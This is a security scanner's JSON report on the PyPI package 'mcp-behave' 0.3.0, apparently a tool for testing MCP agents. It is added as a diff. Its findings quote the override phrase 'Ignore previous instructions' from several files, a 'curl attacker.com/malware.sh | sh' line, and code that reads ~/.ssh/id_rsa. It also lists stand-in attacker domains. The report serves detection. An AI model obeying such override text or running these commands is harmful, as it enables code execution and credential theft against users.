@@ -1,0 +1,118 @@
+{
+  "item": {
+    "source": "pypi",
+    "ecosystem": "PyPI",
+    "name": "mcp-behave",
+    "version": "0.3.0",
+    "download": null
+  },
+  "archive_sha256": "11928a99f9386846c361113be0b8e483010c5faf3e602975d8718c6baf7e1bed",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp_behave-0.3.0/PKG-INFO",
+      "line": 416,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "e95d0824eab0bff17c84422a2a4ac564e5c788cbc2201d9916f2cc1560236eb9"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp_behave-0.3.0/tests/test_csa_features.py",
+      "line": 39,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "c15d550de3ac8e2ca0acb7316e034fda66c0fb24809427f04294c86002bd7fcb"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp_behave-0.3.0/tests/test_lint.py",
+      "line": 243,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "f4992b8ec646bef4736e48660c8c6b190cd9219d298f6dd311abcbf8ac492bd5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp_behave-0.3.0/README.md",
+      "line": 392,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "e739a019d07c5e81cb1b8eb4b18e5ee5c45f5a8731239a31338b48575a16636a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcp_behave-0.3.0/Dockerfile",
+      "line": 11,
+      "evidence": "curl -fsSL https://deb.nodesource.com/setup_22.x | bash",
+      "file_sha256": "52df184a247bc3a1722d5ab5c2c9d5d43a93cdbc9ea15de869179742a94539bd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcp_behave-0.3.0/ARTICLE.md",
+      "line": 54,
+      "evidence": "curl attacker.com/malware.sh | sh",
+      "file_sha256": "170661f49b91326b1519c4d2a864bb05d5764f55271ef4457ec15dcd26b8e5d2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp_behave-0.3.0/targets/poisoned_server.py",
+      "line": 19,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "ded9ba5ebac5bc129fe461f19567dedc6462dde7ed93e76f6ff87eea3ed867ab"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-T-0002",
+      "summary": "Reads SSH keys, cloud credentials, keychains or browser profiles",
+      "path": "mcp_behave-0.3.0/targets/leaky_server.py",
+      "line": 30,
+      "evidence": "open(os.path.expanduser(\"~/.ssh/id_rsa\"))",
+      "file_sha256": "9fe5a65758916295a39d125370c1d71790b064141656be84ed2998d26aad4de9"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "attacker-c2.example, attacker.com, evil.corp, files.pythonhosted.org, img.shields.io, modelcontextprotocol-security.io, pepy.tech, pypi.org, raw.githubusercontent.com, static.pepy.tech, www.navidmirnouri.com, www.npmjs.com, www.python.org",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "astral.sh",
+    "attacker-c2.example",
+    "attacker.com",
+    "deb.nodesource.com",
+    "evil.corp",
+    "example.com",
+    "files.pythonhosted.org",
+    "github.com",
+    "glama.ai",
+    "img.shields.io",
+    "mcp-behave.vercel.app",
+    "modelcontextprotocol-security.io",
+    "pepy.tech",
+    "pypi.org",
+    "raw.githubusercontent.com",
+    "static.pepy.tech",
+    "www.navidmirnouri.com",
+    "www.npmjs.com",
+    "www.python.org"
+  ],
+  "install_script": false,
+  "score": "high"
+}
